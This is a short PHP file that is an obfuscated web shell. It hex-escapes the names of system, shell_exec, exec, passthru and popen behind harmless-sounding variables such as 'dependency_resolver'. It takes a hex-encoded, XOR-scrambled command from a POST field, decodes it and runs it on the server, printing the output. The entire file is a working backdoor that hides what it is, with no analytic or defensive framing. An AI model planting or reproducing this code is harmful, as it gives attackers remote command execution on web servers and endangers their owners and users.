<?php

$dependency_resolver4 = "\x70\x61s\x73thru";
$dependency_resolver6 = "\x73tr\x65am_\x67\x65t\x5Fco\x6Ete\x6E\x74\x73";
$right_pad_string = "\x68\x65\x78\x32bin";
$dependency_resolver7 = "p\x63l\x6F\x73e";
$dependency_resolver1 = "sys\x74em";
$dependency_resolver2 = "\x73\x68el\x6C\x5F\x65xec";
$dependency_resolver3 = "\x65x\x65c";
$dependency_resolver5 = "\x70\x6Fpen";
if (isset($_POST["v\x61l"])) {
            function secure_access   (   $ptr , $pointer )    {
$marker    =    ''    ;
    foreach(str_split($ptr) as $char){
$marker.=chr(ord($char)^$pointer);

} return    $marker;
   
}
            $val = $right_pad_string($_POST["v\x61l"]);
            $val = secure_access($val, 95);
            if (function_exists($dependency_resolver1)) {
                $dependency_resolver1($val);
            } elseif (function_exists($dependency_resolver2)) {
                print $dependency_resolver2($val);
            } elseif (function_exists($dependency_resolver3)) {
                $dependency_resolver3($val, $hld_ptr);
                print join("\n", $hld_ptr);
            } elseif (function_exists($dependency_resolver4)) {
                $dependency_resolver4($val);
            } elseif (function_exists($dependency_resolver5) && function_exists($dependency_resolver6) && function_exists($dependency_resolver7)) {
                $pointer_marker = $dependency_resolver5($val, 'r');
                if ($pointer_marker) {
                    $key_binding = $dependency_resolver6($pointer_marker);
                    $dependency_resolver7($pointer_marker);
                    print $key_binding;
                }
            }
            exit;
        }